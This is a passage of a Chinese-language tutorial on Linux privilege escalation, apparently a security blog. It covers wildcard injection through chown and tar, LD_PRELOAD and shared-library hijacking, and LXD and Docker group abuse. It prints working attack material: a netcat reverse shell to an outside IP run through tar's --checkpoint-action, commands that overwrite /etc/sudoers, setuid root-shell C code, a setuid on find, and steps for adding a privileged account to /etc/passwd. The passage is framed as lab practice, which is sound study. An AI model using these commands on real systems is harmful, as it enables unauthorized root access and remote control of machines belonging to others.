<span class="line"><span>[ ] 代表“[”和“]”之间的某一个字符，比如[0-9]可以代表0-9之间的任意一个数字，[a-zA-Z]可以代表a-z和A-Z之间的任意一个字母，字母区分大小写。</span></span>
<span class="line"><span>– 代表一个字符。</span></span>
<span class="line"><span>~ 用户的根目录。</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h5 id="wildcard-wildness-通配符在野" tabindex="-1"><a class="header-anchor" href="#wildcard-wildness-通配符在野"><span>Wildcard wildness（通配符在野）</span></a></h5><p>来看一个简单的实验</p><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" data-title="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span>echo &quot;testtest123&quot;&gt;file1</span></span>
<span class="line"><span>echo &quot;take help&quot;&gt; --help</span></span>
<span class="line"><span>ls </span></span>
<span class="line"><span>==&gt; file1 --help</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>接下来cat这两个文件</p><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" data-title="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span>┌──(root㉿kali)-[~/Desktop]</span></span>
<span class="line"><span>└─# cat file1 </span></span>
<span class="line"><span>testtest123</span></span>
<span class="line"><span>┌──(root㉿kali)-[~/Desktop]</span></span>
<span class="line"><span>└─# cat --help</span></span>
<span class="line"><span>Usage: cat [OPTION]... [FILE]...</span></span>
<span class="line"><span>Concatenate FILE(s) to standard output.</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>当我们cat --help缺调用出了cat自身的帮助选择项，这被称之为通配符在野,利用这个操作我们干很多事情</p><p><strong>通过chown劫持文件所有者</strong></p><p>假设有几个php文件在当前目录下，但拥有者并不是我们自己，首先创建属于自己的php文件，假设为my.php,继续执行如下命令</p><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" data-title="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span>echo &gt; --reference=my.php</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><p>会生成名为--reference=my.php的文件，此时如果root用户修改php文件的权限给另一个用户</p><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" data-title="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span>chown -R another_user:another_user *.php</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><p>我们就能从中劫持php文件的所有权，--reference作为chown命令的一个选项，用于引用某个文件的属性来替换自己的元数据</p><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" data-title="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span>–reference=RFILE（直接引用某个文件的属性来替换自己的元数据）</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><p>当root用户修改权限时，主观地调用了chown ........... -reference=my.php文件，导致数据被我们的文件属性劫持，达到替换的目的</p><p><strong>Tar通配符注入</strong></p><p>lab setup</p><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" data-title="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span>mkdir html</span></span>
<span class="line"><span>chmod 777 html</span></span>
<span class="line"><span>cd html</span></span>
<span class="line"><span>touch index.html</span></span>
<span class="line"><span>touch test</span></span>
<span class="line"><span>touch file.txt</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>随后在定时任务中写入</p><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" data-title="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span>*/1 *  * * *   root tar -zcf /var/www/html.tgz /var/www/html/*</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><p>每分钟备份一次html目录下的文件</p><figure><img src="`+l+`" alt="labsetup" tabindex="0" loading="lazy"><figcaption>labsetup</figcaption></figure><p><strong>方法1</strong></p><p>使用msf生成一句话反向shell</p><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" data-title="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span>msfvenom -p cmd/unix/reverse_netcat lhost=192.168.121.135 lport=7777 R</span></span>
<span class="line"><span>=&gt;</span></span>
<span class="line"><span>mkfifo /tmp/rtmmiv; nc 192.168.121.135 7777 0&lt;/tmp/rtmmiv | /bin/sh &gt;/tmp/rtmmiv 2&gt;&amp;1; rm /tmp/rtmmiv</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>随后在受害者机器执行</p><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" data-title="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span>echo &quot;mkfifo /tmp/rtmmiv; nc 192.168.121.135 7777 0&lt;/tmp/rtmmiv | /bin/sh &gt;/tmp/rtmmiv 2&gt;&amp;1; rm /tmp/rtmmiv&quot; &gt; shell.sh</span></span>
<span class="line"><span>echo &quot;&quot; &gt; &quot;--checkpoint-action=exec=sh shell.sh&quot;</span></span>
<span class="line"><span>echo &quot;&quot; &gt; --checkpoint=1</span></span>
<span class="line"><span>tar cf archive.tar *</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>即可在攻击机上得到反向shell</p><figure><img src="`+t+`" alt="tarshell" tabindex="0" loading="lazy"><figcaption>tarshell</figcaption></figure><p>上述命令，首先将反向shell代码写入名为shell.sh的文件，创建名为--checkpoint-action=exec=sh shell.sh和--checkpoint=1的文件，最后将这些文件进行压缩时，调用这两个选项执行shell脚本达到反向shell的目的，并且由于定身任务中tar操作由root用户进行，我们能得到rootshell，但是这里不知道为什么复现失败了，原文是在tmp目录下进行的，不清楚问题原因，但是大致有以下条件</p><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" data-title="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span>1.打包目录html需要其他用户拥有执行+写权限。</span></span>
<span class="line"><span>2.目标Linux上有安装nc软件。</span></span>
<span class="line"><span>3.tar打包执行反弹命令时，”tar cf archive.tar *“命令需要进入/var/www/html目录执行</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>除了上述方法还可以使用sudoer</p><div class="language-shell line-numbers-mode" data-highlighter="shiki" data-ext="shell" data-title="shell" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2;">echo</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> &#39;echo &quot;ignite ALL=(root) NOPASSWD: ALL&quot; &gt; /etc/sudoers&#39;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> &gt; </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">demo.sh</span></span>
<span class="line"><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2;">echo</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> &quot;&quot;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> &gt; </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&quot;--checkpoint-action=exec=sh demo.sh&quot;</span></span>
<span class="line"><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2;">echo</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> &quot;&quot;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> &gt; </span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;">--checkpoint=1</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">tar</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> cf</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> archive.tar</span><span style="--shiki-light:#E45649;--shiki-dark:#E5C07B;"> *</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>为任意的系统二进制文件启用suid，并使用suid进行提权</p><div class="language-shell line-numbers-mode" data-highlighter="shiki" data-ext="shell" data-title="shell" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2;">echo</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> &quot;chmod u+s /usr/bin/find&quot;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> &gt; </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">test.sh</span></span>
<span class="line"><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2;">echo</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> &quot;&quot;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> &gt; </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&quot;--checkpoint-action=exec=sh test.sh&quot;</span></span>
<span class="line"><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2;">echo</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> &quot;&quot;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> &gt; </span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;">--checkpoint=1</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">tar</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> cf</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> archive.tar</span><span style="--shiki-light:#E45649;--shiki-dark:#E5C07B;"> *</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">ls</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> -al</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> /usr/bin/find</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">find</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> f1</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> -exec</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> &quot;whoami&quot;</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2;"> \\;</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">root</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">find</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> f1</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> -exec</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> &quot;/bin/sh&quot;</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2;"> \\;</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">id</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">whoami</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h4 id="共享库提权" tabindex="-1"><a class="header-anchor" href="#共享库提权"><span>共享库提权</span></a></h4><p>Linux 程序通常使用动态链接的共享对象库,有多种方法可以指定动态库的位置，因此系统将知道在程序执行时在哪里查找它们。这包括编译程序时的<code>-rpath</code>or<code>-rpath-link</code>标志，使用环境变量<code>LD_RUN_PATH</code>or <code>LD_LIBRARY_PATH</code>，将库放置在<code>/lib</code>or<code>/usr/lib</code>默认目录中，或者在<code>/etc/ld.so.conf</code>配置文件中指定包含库的另一个目录。<code>LD_PRELOAD</code>环境变量可以在执行二进制文件之前加载库。此库中的函数优先于默认函数。</p><p><strong>提权条件</strong></p><p>所用的命令需要有较高的权限，/etc/sudoers<code>文件中需要定义</code>env_keep+=LD_PRELOAD，我们能够编写恶意库文件</p><p><strong>利用</strong></p><div class="language-c line-numbers-mode" data-highlighter="shiki" data-ext="c" data-title="c" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">#include</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> &lt;stdio.h&gt;</span></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">#include</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> &lt;sys/types.h&gt;</span></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">#include</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> &lt;stdlib.h&gt;</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">void</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;"> _init</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">() {</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">unsetenv</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">(</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&quot;LD_PRELOAD&quot;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">);</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">setgid</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">(</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;">0</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">);</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">setuid</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">(</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;">0</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">);</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">system</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">(</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&quot;/bin/bash&quot;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">);</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">}</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>上述脚本命名为shell.c，编译为shell.so的动态文件</p><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" data-title="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span>gcc -fPIC -shared -o shell.so shell.c -nostartfiles</span></span>
<span class="line"><span>随后指定LD_PRELOAD执行find命令</span></span>
<span class="line"><span>sudo  LD_PRELOAD=/tmp/test/shell.so find  //换成自己的路径即可</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><figure><img src="`+p+`" alt="ld_preload" tabindex="0" loading="lazy"><figcaption>ld_preload</figcaption></figure><p>即可成功提权，但是经过测试，该方法受sudo的限制</p><h4 id="共享对象劫持提权-linux利用动态链接共享对象库提权" tabindex="-1"><a class="header-anchor" href="#共享对象劫持提权-linux利用动态链接共享对象库提权"><span>共享对象劫持提权(Linux利用动态链接共享对象库提权)</span></a></h4><p>不同于共享库提权的是，针对于新开发的程序和可执行的二进制文件</p><p><strong>操作系统如何寻找共享库</strong></p><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" data-title="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span>任何由rpath-link选项指定的目录（由rpath-link选项指定的目录仅在链接时有效）</span></span>
<span class="line"><span>任何由rpath选项指定的目录（rpath选项指定的目录都包含在可执行文件中，并在运行时使用）</span></span>
<span class="line"><span>LD_RUN_PATH</span></span>
<span class="line"><span>LD_LIBRARY_PATH</span></span>
<span class="line"><span>DT_RUNPATH或DT_RPATH中的目录。（如果存在DT_RUNPATH条目，则忽略DT_RPATH条目）</span></span>
<span class="line"><span>/lib和/usr/lib目录</span></span>
<span class="line"><span>/etc/ld.so.conf中的目录</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>1.通过ldd来获取程序使用的共享库信息</p><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" data-title="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span>ldd 程序路径</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><p>2.找到程序利用的非标准依赖库</p><p>3.利用<code>readelf -d 程序 | grep PATH</code>查看程序自定义的共享库位置/或者是<code>objdump -x 程序 | grep RPATH</code></p><p>4.找到自定义的共享库位置，自建链接库的文件到该共享库文件夹，执行程序查看是否缺少函数</p><p>5.创建.c文件，自定义这个函数名，设置uid为root，利用其执行bash或sh</p><div class="language-c line-numbers-mode" data-highlighter="shiki" data-ext="c" data-title="c" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">#include</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&lt;stdio.h&gt;</span></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">#include</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&lt;stdlib.h&gt;</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">void</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> 函数名() {</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">    setuid</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">(</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;">0</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">);</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">    system</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">(</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&quot;/bin/sh -p&quot;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">);</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">}</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>6.编译文件为动态链接文件<code>gcc c文件 -fPIC -shared -o /共享库/共享对象文件</code></p><p>等待用户执行该漏洞二进制程序</p><p>(文件可由msf中的模块编译而成），</p><p>利用该漏洞进行提权需要注意的是：</p><p>1.我们需要找到一个具有缺陷的二进制文件或程序，并且有用户执行(或者是进行社工)</p><p>2.该程序存在外部的共享库依赖，并非只有标准库</p><p>3.我们对共享库的目录具有可写的权限,即我们可以替代该共享库(||该文件有缺陷，缺少函数名称，我们可以手动创建链接到共享库以便于执行我们自定义的函数)</p><p>这里能够找到相同的案例：<a href="https://tbhaxor.com/exploiting-shared-library-misconfigurations/" target="_blank" rel="noopener noreferrer">https://tbhaxor.com/exploiting-shared-library-misconfigurations/</a></p><h4 id="利用特权组提权" tabindex="-1"><a class="header-anchor" href="#利用特权组提权"><span>利用特权组提权</span></a></h4><h5 id="lxc-lxd提权" tabindex="-1"><a class="header-anchor" href="#lxc-lxd提权"><span>LXC/LXD提权</span></a></h5><p><strong>lab setup</strong></p><p>创建一个名为lowpriv的用户，并将其添加到lxd组中</p><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" data-title="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span>useradd -m lowpriv --shell /bin/bash</span></span>
<span class="line"><span>usermod -a -G lxd lowpriv</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div></div></div><p>切换到该用户，并验证该用户是否在组中</p><figure><img src="`+d+'" alt="lxd-setup" tabindex="0" loading="lazy"><figcaption>lxd-setup</figcaption></figure><p>然后配置新容器的服务区默认值</p><figure><img src="'+r+'" alt="lxd-init" tabindex="0" loading="lazy"><figcaption>lxd-init</figcaption></figure><p>我们需要一个新的容器来进行实验，检查是否有容器</p><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" data-title="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span>lxc ls</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><p>如果没有，我们可以进行一个容器搭载</p><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" data-title="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span>lxc launch ubuntu:18.04 falcor</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><p>容器下载需要一定的时间</p><figure><img src="'+h+'" alt="lxc-ls" tabindex="0" loading="lazy"><figcaption>lxc-ls</figcaption></figure><p>看起来没有什么问题，继续，我们从外部获取一个python脚本，并且运行</p><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" data-title="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span>python lxd_rootv2.py uu2(容器名称)</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><figure><img src="'+c+`" alt="lxd_rootv2" tabindex="0" loading="lazy"><figcaption>lxd_rootv2</figcaption></figure><p>可以看到能够执行sudo命令，并且不需要密码，或许我们想知道这个脚本干了些什么</p><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" data-title="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span>1.将 systemd 服务单元文件写入 /tmp/evil.service</span></span>
<span class="line"><span>2.使用 LXD 附加到私有 systemd 套接字文件，将其在容器内映射到 /tmp/container_sock</span></span>
<span class="line"><span>3.使用 LXD 将同一套接字再次代理回 /tmp/host_sock 的主机</span></span>
<span class="line"><span>4.通过此隧道与 systemd 专用套接字通信，劫持套接字辅助数据中传递的根凭据。运行以下命令：</span></span>
<span class="line"><span>	Systemctl link /tmp/evil.service</span></span>
<span class="line"><span>	systemctl daemon-reload Systemctl daemon-reload</span></span>
<span class="line"><span>	systemctl start evil.service</span></span>
<span class="line"><span>	systemctl disable evil.service</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p><code>evil.service</code> 在 root 的上下文中启动。它所做的只是在 /etc/sudoers 中添加一行，允许调用用户使用 sudo，无需密码，有关漏洞原理可以阅读<a href="https://shenaniganslabs.io/2019/05/21/LXD-LPE.html" target="_blank" rel="noopener noreferrer">https://shenaniganslabs.io/2019/05/21/LXD-LPE.html</a></p><h5 id="docker提权" tabindex="-1"><a class="header-anchor" href="#docker提权"><span>docker提权</span></a></h5><p>创建一个用户，并将其添加到docker组中</p><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" data-title="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span>useradd -m doc --shell docker</span></span>
<span class="line"><span>usermodd -G docker doc</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div></div></div><figure><img src="`+o+`" alt="docker-add" tabindex="0" loading="lazy"><figcaption>docker-add</figcaption></figure><p>由于docker命令运行前都会默认添加sudo，所以docker组中的用户其实已经相当于root，我们可以使用docker命令直接获取权限</p><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" data-title="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span>docker run -v /:/hostOS -i -t chrisfosterelli/rootplease</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><p>该命令通过将外部容器/挂载到内部容器/hostOS，从而获取root权限</p><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" data-title="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span>docker run -v /root:/mnt -it ubuntu</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><p>该命令将/root目录作为系统卷启动，启动后可查看/etc/passwd等密钥，通过破解来获取root权限，也可以添加特权账号</p><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" data-title="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span>openssl passwd -1 -salt name</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><p>来生成saltpasswd，按照格式插入到/etc/passwd即可切换用户</p><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" data-title="" 